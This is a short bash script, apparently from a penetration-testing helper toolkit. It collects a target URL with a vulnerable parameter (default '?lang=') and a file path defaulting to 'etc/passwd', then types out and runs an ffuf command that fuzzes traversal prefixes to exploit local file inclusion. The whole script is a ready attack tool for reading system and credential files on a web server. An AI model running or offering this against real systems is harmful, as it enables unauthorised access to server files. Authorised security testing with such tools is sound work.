#!/bin/bash

: '
fuzz for LFI root directory with custom wordlist
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
WEBSITE_FIELD=$(form_item "website" "website" "http://domain.com/?lang=")
FILE_FIELD=$(form_item "file" "file" "etc/passwd")

# Generate GUI form
generate_form "${WEBSITE_FIELD}" "${FILE_FIELD}"

WEBSITE=${form_data["website"]}
FILE=${form_data["file"]}
WORDLIST="${SCRIPTS_DIR}/web/lfi/.files/root_directory_wordlist.txt"

paste_command "ffuf -w ${WORDLIST}:FUZZ -u '${WEBSITE}FUZZ${FILE}'"
xdotool key Return